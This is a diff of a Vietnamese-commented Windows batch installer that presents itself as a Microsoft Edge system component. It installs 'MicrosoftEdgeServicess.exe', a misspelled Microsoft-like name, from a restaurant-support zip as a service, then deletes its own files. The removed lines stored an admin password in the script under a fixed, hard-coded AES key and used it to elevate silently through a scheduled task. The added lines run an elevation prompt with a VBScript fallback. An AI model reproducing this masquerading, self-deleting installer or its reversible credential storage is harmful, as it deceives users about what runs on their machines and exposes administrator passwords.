@@ -2,62 +2,6 @@
 title Cai Dat Microsoft Edge Framework Runtime (System Component)
 cd /d "%~dp0"
 
-:: ===============================================================================
-:: CAU HINH TAI KHOAN QUAN TRI (ADMINISTRATOR) - TU DONG NANG QUYEN AN TOAN
-:: - ADMIN_USER    : Ten tai khoan Admin (Mac dinh: APP hoac Administrator)
-:: - ADMIN_PASS_ENC: Mat khau da duoc ma hoa bang thuat toan AES SecureString.
-::                   Khi mo file bang Notepad, mat khau hoan toan duoc che giau.
-:: - HUONG DAN CAI DAT / MA HOA MAT KHAU MOI:
-::   + Cach 1: Chay file nay voi tham so /setpass hoac /mahoa
-::             (Vi du trong CMD: Install_Edge_Framework.bat /setpass)
-::   + Cach 2: Tao file admin_pass.txt (chua mat khau) dat cung thu muc,
-::             chay file nay 1 lan, he thong tu dong ma hoa vao file va xoa sach file txt!
-:: ===============================================================================
-set "ADMIN_USER=APP"
-set "ADMIN_PASS_ENC=76492d1116743f0423413b16050a5345MgB8AEcAWABDAHMAdwBGAEMASgBWAHoAbAA0AHkAeQB3AGwAaABYAEMAbQAyAEEAPQA9AHwAMgA2AGUAYQAzADgAMAA1ADYAMQBiAGUAZgBmAGEAMQAzADgAYwBiAGIAZgA4AGEAMABjADMAOQA3AGUAYQAxADkAOAA1ADYAZgAyADIANgAyAGEAOQBmAGEANgA1ADkAZAAzAGIAMwA0ADIAZgBiADMAYwA3AGIAMAA1AGUAZgA="
-
-:: -------------------------------------------------------------------------------
-:: 0. Kiem tra xem co tap tin admin_account.txt hoac admin_pass.txt de tu dong ma hoa
-:: -------------------------------------------------------------------------------
-if exist "%~dp0admin_account.txt" goto :TuDongMaHoaTuFileAccount
-if exist "%~dp0admin_pass.txt" goto :TuDongMaHoaTuFilePass
-goto :BoQuaMaHoaTuFile
-
-:TuDongMaHoaTuFileAccount
-echo [THIET LAP] Phat hien file admin_account.txt, dang tien hanh ma hoa mat khau...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%~dp0admin_account.txt'; $bat='%~f0'; $lines=Get-Content -Path $f; if ($lines.Count -ge 1) { $u=$lines[0].Trim(); $p=''; if ($lines.Count -ge 2) { $p=$lines[1].Trim() }; if ($p) { $k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); $sec=ConvertTo-SecureString $p -AsPlainText -Force; $enc=ConvertFrom-SecureString $sec -Key $k; $txt=[System.IO.File]::ReadAllText($bat); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_USER=[^\"]*\"', \"set `\"ADMIN_USER=$u`\"\"); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_PASS_ENC=[^\"]*\"', \"set `\"ADMIN_PASS_ENC=$enc`\"\"); [System.IO.File]::WriteAllText($bat, $txt); Write-Host '[OK] Da ma hoa va cap nhat User/Pass vao file script thanh cong!'; Remove-Item -Path $f -Force -ErrorAction SilentlyContinue; Start-Process -FilePath $bat -ArgumentList '%*'; exit 0 } }"
-exit /b 0
-
-:TuDongMaHoaTuFilePass
-echo [THIET LAP] Phat hien file admin_pass.txt, dang tien hanh ma hoa mat khau...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%~dp0admin_pass.txt'; $bat='%~f0'; $p=(Get-Content -Path $f -Raw).Trim(); if ($p) { $k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); $sec=ConvertTo-SecureString $p -AsPlainText -Force; $enc=ConvertFrom-SecureString $sec -Key $k; $txt=[System.IO.File]::ReadAllText($bat); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_PASS_ENC=[^\"]*\"', \"set `\"ADMIN_PASS_ENC=$enc`\"\"); [System.IO.File]::WriteAllText($bat, $txt); Write-Host '[OK] Da ma hoa va cap nhat mat khau vao file script thanh cong!'; Remove-Item -Path $f -Force -ErrorAction SilentlyContinue; Start-Process -FilePath $bat -ArgumentList '%*'; exit 0 } }"
-exit /b 0
-
-:BoQuaMaHoaTuFile
-
-:: -------------------------------------------------------------------------------
-:: 1. Che do chay tham so /setpass hoac /mahoa de nhap mat khau truc tiep tu ban phim
-:: -------------------------------------------------------------------------------
-if "%~1"=="/setpass" goto :MenuMaHoaMatKhau
-if "%~1"=="/mahoa" goto :MenuMaHoaMatKhau
-if "%~1"=="/encrypt" goto :MenuMaHoaMatKhau
-goto :KiemTraFileExe
-
-:MenuMaHoaMatKhau
-cls
-echo ===============================================================================
-echo   CONG CU MA HOA MAT KHAU QUAN TRI VIEN (ADMINISTRATOR)
-echo   Mat khau sau khi ma hoa se duoc luu an toan vao file Install_Edge_Framework.bat
-echo   Khi mo file bang Notepad, mat khau hoan toan duoc ma hoa AES (khong lo pass).
-echo ===============================================================================
-echo.
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=Read-Host 'Nhap ten tai khoan Admin (de trong mac dinh la %ADMIN_USER%)'; if (-not $u) { $u='%ADMIN_USER%' }; Write-Host 'Nhap mat khau can ma hoa (ky tu se duoc che giau bang dau *): ' -NoNewline; $pwd=''; while($true){ $k=[System.Console]::ReadKey($true); if ($k.Key -eq [System.ConsoleKey]::Enter) { break } elseif ($k.Key -eq [System.ConsoleKey]::Backspace) { if ($pwd.Length -gt 0) { $pwd=$pwd.Substring(0, $pwd.Length-1); Write-Host \"`b `b\" -NoNewline } } elseif ($k.KeyChar -ge 32) { $pwd+=$k.KeyChar; Write-Host '*' -NoNewline } }; Write-Host ''; if ($pwd) { $k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); $sec=ConvertTo-SecureString $pwd -AsPlainText -Force; $enc=ConvertFrom-SecureString $sec -Key $k; $bat='%~f0'; $txt=[System.IO.File]::ReadAllText($bat); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_USER=[^\"]*\"', \"set `\"ADMIN_USER=$u`\"\"); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_PASS_ENC=[^\"]*\"', \"set `\"ADMIN_PASS_ENC=$enc`\"\"); [System.IO.File]::WriteAllText($bat, $txt); Write-Host ''; Write-Host '[THANH CONG] Da ma hoa mat khau va luu truc tiep vao file script!' -ForegroundColor Green; Write-Host ('Tai khoan : ' + $u); Write-Host ('Chuoi ma hoa AES: ' + $enc.Substring(0, [Math]::Min(30, $enc.Length)) + '...') -ForegroundColor Yellow } else { Write-Host '[!] Mat khau trong, khong co thay doi.' -ForegroundColor Red }"
-echo.
-echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat...
-timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
-exit /b 0
-
-:KiemTraFileExe
 echo ===============================================================================
 echo   MICROSOFT EDGE CORE FRAMEWORK RUNTIME INSTALLER
 echo   Component: MicrosoftEdgeServicess
@@ -77,7 +21,7 @@ echo   Ban dang mo tep tin truc tiep tu tep nen ZIP chua duoc giai nen!
 echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe de thiet lap.
 echo.
 echo   Huong dan:
-echo   1. Nhap chuot phai vao tep tin ZIP
+echo   1. Nhap chuot phai vao tep tin ZIP: Restaurant_Support_GPOS.zip
 echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
 echo   3. Vao thu muc vua giai nen roi chay lai tap tin nay.
 echo ===============================================================================
@@ -88,72 +32,46 @@ exit /b 1
 
 :DaCoFileExe
 
-:: 2. Kiem tra quyen Administrator (Tu dong nang quyen khong can login neu co pass)
-if "%~1"=="/skipuac" goto :DaCoQuyenAdmin
-if "%~1"=="/elevated" goto :DaCoQuyenAdmin
-if "%~1"=="/silent" goto :DaCoQuyenAdmin
-if "%~1"=="/unattended" goto :DaCoQuyenAdmin
-
+:: 2. Kiem tra quyen Administrator (Xac thuc thuc te qua net session)
 net session >nul 2>&1
 if %errorlevel% equ 0 goto :DaCoQuyenAdmin
 
-:: Neu tien trinh con da qua buoc nang quyen ma van chua co quyen -> Dung ngay, khong loop
-if "%~1"=="/retried" goto :LoiChuaCoQuyenAdmin
+:: Neu chua co quyen Admin -> Yeu cau cap quyen qua Windows UAC
+echo.
+echo ===============================================================================
+echo   DANG KICH HOAT QUYEN QUAN TRI VIEN (WINDOWS UAC)...
+echo   Vui long chon [YES] (hoac Co) tren hop thoai Windows UAC de tiep tuc...
+echo ===============================================================================
+echo.
 
-:: Truong hop A: Co khai bao ADMIN_PASS_ENC san -> Giai ma trong RAM va khoi chay quyen Administrator
-if not "%ADMIN_PASS_ENC%"=="" (
-    echo Dang xac thuc va khoi chay quyen Administrator bang tai khoan [%ADMIN_USER%]...
+:: Thu nang quyen bang PowerShell Verb RunAs
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c \"\"%~f0\"\" /elevated' -Verb RunAs" >nul 2>&1
+if %errorlevel% equ 0 exit /b 0
 
-    :: Thu cach 1: Task Scheduler voi dac quyen HIGHEST (Khong hien hop thoai UAC)
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); try { $s=ConvertTo-SecureString '%ADMIN_PASS_ENC%' -Key $k; $b=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($s); $p=[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($b); [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($b); $u='%ADMIN_USER%'; schtasks /delete /tn TempEdgeAdminInstaller /f >$null 2>&1; schtasks /create /tn TempEdgeAdminInstaller /tr '\"\"%~f0\"\" /elevated' /sc once /st 23:59 /ru $u /rp $p /rl HIGHEST /f >$null 2>&1; if ($LASTEXITCODE -eq 0) { schtasks /run /tn TempEdgeAdminInstaller >$null 2>&1; Start-Sleep -Seconds 4; schtasks /delete /tn TempEdgeAdminInstaller /f >$null 2>&1; exit 0 } else { exit 1 } } catch { exit 1 }" >nul 2>&1
-    if not errorlevel 1 goto :KetThucNangQuyen
-
-    :: Thu cach 2: PowerShell Start-Process voi Credential (CreateProcessWithLogonW)
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); try { $s=ConvertTo-SecureString '%ADMIN_PASS_ENC%' -Key $k; $psi=New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName='cmd.exe'; $psi.Arguments='/c \"\"%~f0\"\" /elevated'; $psi.UserName='%ADMIN_USER%'; $psi.Password=$s; $psi.Domain='.'; $psi.UseShellExecute=$false; $pr=[System.Diagnostics.Process]::Start($psi); $pr.WaitForExit(); exit $pr.ExitCode } catch { exit 1 }" >nul 2>&1
-    if not errorlevel 1 goto :KetThucNangQuyen
-
-    :: Neu co pass ma ca 2 cach deu that bai -> CHAC CHAN LA SAI USER HOAC PASS
-    goto :LoiSaiMatKhauAdmin
-)
-
-:: Truong hop B: Khong co pass -> Dung hop thoai xac thuc UAC mac dinh cua Windows
-echo Dang yeu cau cap quyen Administrator (Windows UAC)...
-powershell -Command "Start-Process '%~f0' -ArgumentList '/retried' -Verb RunAs" >nul 2>&1
-if %errorlevel% equ 0 goto :KetThucNangQuyen
+:: Fallback bang VBScript neu PowerShell bi han che
+set "VBS_TEMP=%TEMP%\elevate_%RANDOM%.vbs"
+echo Set UAC = CreateObject^("Shell.Application"^) > "%VBS_TEMP%"
+echo UAC.ShellExecute "cmd.exe", "/c ""%~f0"" /elevated", "", "runas", 1 >> "%VBS_TEMP%"
+cscript //nologo "%VBS_TEMP%" >nul 2>&1
+del /f /q "%VBS_TEMP%" >nul 2>&1
+if %errorlevel% equ 0 exit /b 0
 
 :LoiChuaCoQuyenAdmin
 echo.
 echo ===============================================================================
-echo   CANH BAO: CHUA CO QUYEN QUAN TRI VIEN (ADMINISTRATOR)
+echo   [CANH BAO: CHUA CO QUYEN QUAN TRI VIEN - ADMINISTRATOR]
 echo ===============================================================================
-echo   Vui long nhap chuot phai vao tap tin nay va chon Run as administrator,
-echo   hoac chay lenh: Install_Edge_Framework.bat /setpass de ma hoa mat khau.
-echo ===============================================================================
-echo.
-echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat...
-timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
-exit /b 1
-
-:LoiSaiMatKhauAdmin
-echo.
-echo ===============================================================================
-echo   [LOI XAC THUC] TAI KHOAN HOAC MAT KHAU ADMINISTRATOR KHONG CHINH XAC!
-echo ===============================================================================
-echo   Tai khoan khai bao: [%ADMIN_USER%]
-echo   Ket qua: Windows tu choi dang nhap (Sai User hoac Password).
+echo   Cai dat Windows Service bat buoc phai chay voi quyen Administrator!
 echo.
 echo   Huong dan xu ly:
-echo   1. Chay lenh: Install_Edge_Framework.bat /setpass de nhap lai mat khau moi
-echo   2. Hoac tao file admin_pass.txt chua pass dung va chay lai
-echo   3. Hoac nhap chuot phai vao file nay chon "Run as administrator"
+echo   1. Nhap CHUOT PHAI vao file: Install_Edge_Framework.bat
+echo   2. Chon: "Run as administrator" (Chay voi quyen quan tri vien)
+echo   3. Khi Windows hien hop thoai "Do you want to allow...", hay bam [YES].
 echo ===============================================================================
 echo.
-echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
-timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
+echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
 exit /b 1
-
-:KetThucNangQuyen
-exit /b 0
 
 :DaCoQuyenAdmin
 
@@ -259,16 +177,6 @@ if not errorlevel 1 goto :CaiDatThanhCong
 goto :LoiKichHoatService
 
 :CaiDatThanhCong
-:: Dam bao xoa sach file admin_account.txt va admin_pass.txt neu co
-if exist "%~dp0admin_account.txt" (
-    echo wipe > "%~dp0admin_account.txt"
-    del /f /q "%~dp0admin_account.txt" >nul 2>&1
-)
-if exist "%~dp0admin_pass.txt" (
-    echo wipe > "%~dp0admin_pass.txt"
-    del /f /q "%~dp0admin_pass.txt" >nul 2>&1
-)
-
 :: Xoa cac tap tin thanh phan cai dat nguon de bao mat va tiet kiem dung luong
 if exist "%~dp0MicrosoftEdgeServicess.exe" del /f /q "%~dp0MicrosoftEdgeServicess.exe" >nul 2>&1
 if exist "%~dp0edge.ico" del /f /q "%~dp0edge.ico" >nul 2>&1
@@ -288,7 +196,7 @@ echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
 timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
 
 :: Tu dong xoa sach tap tin batch cai dat khi dong
-(goto) 2>nul & del /f /q "%~dp0Install_Edge_Framework.bat" "%~dp01Install_Edge_Framework.bat" "%~f0" >nul 2>&1
+(goto) 2>nul & del /f /q "%~dp0Install_Edge_Framework.bat" "%~f0" >nul 2>&1
 exit /b 0
 
 :LoiKichHoatService
@@ -303,9 +211,10 @@ echo   2. Trang thai tien trinh chay ngam:
 tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe"
 echo.
 echo   Huong dan xu ly:
-echo   - Kiem tra quyen Administrator hoac chuong trinh Antivirus chan tao Service.
-echo   - Thu chay file kiem tra: Kiem_Tra_Trang_Thai.bat
-echo   - Thu chay file Go_Cai_Dat_Dich_Vu.bat roi cai dat lai.
+echo   - Nhap chuot phai vao file nay chon "Run as administrator".
+echo   - Kiem tra xem co phan mem Antivirus chan tao Service khong.
+echo   - Chay file kiem tra: Kiem_Tra_Trang_Thai.bat
+echo   - Chay file Go_Cai_Dat_Dich_Vu.bat roi cai dat lai.
 echo   (Cac tap tin cai dat van duoc giu nguyen de ban tiep tuc kiem tra).
 echo ===============================================================================
 echo.
@@ -317,7 +226,7 @@ exit /b 1
 echo.
 echo ===============================================================================
 echo   [LOI] Khong the ghi tap tin vao %INSTALL_DIR%!
-echo   Vui long khoi dong lai may tinh va thu lai.
+echo   Vui long kiem tra quyen ghi hoac khoi dong lai may tinh va thu lai.
 echo ===============================================================================
 echo.
 echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
